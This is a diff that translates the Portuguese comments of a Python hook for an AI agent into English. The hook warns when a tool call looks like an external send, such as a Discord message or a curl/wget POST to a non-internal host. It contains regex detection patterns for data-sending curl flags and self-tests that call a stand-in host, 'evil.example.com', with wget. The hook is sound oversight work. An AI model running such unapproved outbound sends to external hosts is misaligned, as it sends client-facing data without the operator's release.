@@ -1,26 +1,26 @@
 #!/usr/bin/env python3
 """
-external_send_draft_gate (Operator Kit) — PreToolUse WARN-only: detecta envio
-EXTERNO (mensagem a cliente / Discord / POST HTTP p/ host externo) e lembra de
-confirmar explicitamente ou salvar um RASCUNHO no draft_dir antes.
+external_send_draft_gate (Operator Kit) - PreToolUse WARN-only: detects an
+EXTERNAL send (message to a client / Discord / HTTP POST to an external host) and
+reminds you to confirm explicitly or save a DRAFT in draft_dir first.
 
-Por que existe: comunicação client-facing fica em rascunho até o operador liberar.
-Este hook NÃO tenta provar que houve aprovação prévia (impossível de inferir com
-segurança); apenas AVISA que a ação parece um envio externo.
+Why it exists: client-facing communication stays a draft until the operator
+releases it. This hook does NOT try to prove prior approval happened (impossible
+to infer safely); it only WARNS that the action looks like an external send.
 
-Lê JSON do stdin: tool_name + tool_input (command / url / etc.).
-Dispara quando:
-  (a) tool_name está em guardrails.external_send_tools (do profile), OU
-  (b) command é curl/wget com método POST/PUT para um host EXTERNO
-      (não localhost / 127.0.0.1 / *.local).
+Reads JSON from stdin: tool_name + tool_input (command / url / etc.).
+Fires when:
+  (a) tool_name is in guardrails.external_send_tools (from the profile), OR
+  (b) command is curl/wget with a POST/PUT method to an EXTERNAL host
+      (not localhost / 127.0.0.1 / *.local).
 
 Config (operator-profile.yaml):
-  guardrails.external_send_tools: [lista de nomes de tool MCP]
-  paths.draft_dir: "drafts/"  (citado no aviso)
+  guardrails.external_send_tools: [list of MCP tool names]
+  paths.draft_dir: "drafts/"  (quoted in the warning)
 
-WARN em stderr · exit 0 SEMPRE · qualquer erro -> exit 0 (defensivo).
+WARN to stderr - exit 0 ALWAYS - any error -> exit 0 (defensive).
 
-v1.0.0 — 2026-06-19 (Operator Kit · cluster guard-distinct)
+v1.0.0 - 2026-06-19 (Operator Kit - guard-distinct cluster)
 """
 from __future__ import annotations
 
@@ -43,13 +43,13 @@ _DEFAULT_SEND_TOOLS = [
     "mcp__discord__discord_send_message",
 ]
 
-# hosts internos que NÃO contam como envio externo
+# internal hosts that do NOT count as an external send
 _INTERNAL_HOST_RE = re.compile(
     r"^(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|.*\.local|.*\.internal)$",
     re.IGNORECASE,
 )
 
-# curl/wget com POST/PUT/PATCH (envio de dados)
+# curl/wget with POST/PUT/PATCH (data send)
 _POST_FLAG_RE = re.compile(
     r"(?:-X\s*(?:POST|PUT|PATCH)\b|--request\s+(?:POST|PUT|PATCH)\b|--data\b|-d\b|--data-raw\b|--data-binary\b|--upload-file\b|--method=(?:POST|PUT|PATCH))",
     re.IGNORECASE,
@@ -65,7 +65,7 @@ def _send_tools(prof: dict) -> list[str]:
 
 
 def _is_external_url(command: str) -> str | None:
-    """Se o command tem URL http(s) p/ host externo, devolve o host; senão None."""
+    """If the command has an http(s) URL to an external host, returns the host; else None."""
     for m in _URL_RE.finditer(command or ""):
         host = m.group(1).split("@")[-1].split(":")[0]
         if not _INTERNAL_HOST_RE.match(host):
@@ -75,8 +75,8 @@ def _is_external_url(command: str) -> str | None:
 
 def evaluate(tool_name: str, tool_input: dict, send_tools: list[str]) -> str | None:
     """
-    Retorna a RAZÃO do aviso (str) ou None se não for envio externo.
-    Determinístico, testável sem rede.
+    Returns the REASON for the warning (str) or None if it is not an external send.
+    Deterministic, testable without network.
     """
     if tool_name and tool_name in send_tools:
         return f"external-send tool `{tool_name}`"
@@ -131,28 +131,28 @@ def main() -> None:
 
 def _self_test() -> None:
     tools = _DEFAULT_SEND_TOOLS
-    # 1. tool de envio externo configurada -> avisa
+    # 1. configured external-send tool -> warns
     r = evaluate("mcp__discord__discord_send_message", {}, tools)
     assert r and "external-send" in r, f"should warn on discord, got {r}"
-    # 2. curl POST p/ host externo -> avisa
+    # 2. curl POST to an external host -> warns
     r2 = evaluate("Bash", {"command": "curl -X POST https://api.cliente.com/msg -d 'oi'"}, tools)
     assert r2 and "external host" in r2, f"should warn on external curl POST, got {r2}"
-    # 3. curl GET p/ host externo (sem POST/data) -> NÃO avisa (não é envio)
+    # 3. curl GET to an external host (no POST/data) -> does NOT warn (not a send)
     r3 = evaluate("Bash", {"command": "curl https://api.cliente.com/status"}, tools)
     assert r3 is None, f"an external GET is not a send, it should not warn: {r3}"
-    # 4. curl POST p/ localhost -> NÃO avisa (interno)
+    # 4. curl POST to localhost -> does NOT warn (internal)
     r4 = evaluate("Bash", {"command": "curl -X POST http://localhost:9000/data -d '{}'"}, tools)
     assert r4 is None, f"an internal POST should not warn: {r4}"
-    # 5. wget p/ host externo -> avisa (wget baixa/envia)
+    # 5. wget to an external host -> warns (wget downloads/sends)
     r5 = evaluate("Bash", {"command": "wget https://evil.example.com/x"}, tools)
     assert r5 and "external host" in r5, f"should warn on external wget, got {r5}"
-    # 6. comando comum -> NÃO avisa
+    # 6. ordinary command -> does NOT warn
     r6 = evaluate("Bash", {"command": "ls -la docs/"}, tools)
     assert r6 is None, f"ls should not warn: {r6}"
-    # 7. tool desconhecida sem command -> NÃO avisa
+    # 7. unknown tool with no command -> does NOT warn
     r7 = evaluate("Read", {"file_path": "x.md"}, tools)
     assert r7 is None, f"Read should not warn: {r7}"
-    # 8. curl POST p/ 127.0.0.1 -> interno, sem aviso
+    # 8. curl POST to 127.0.0.1 -> internal, no warning
     r8 = evaluate("Bash", {"command": "curl --data 'a=1' http://127.0.0.1:8080/health"}, tools)
     assert r8 is None, f"127.0.0.1 is internal: {r8}"
     print("self-test OK")
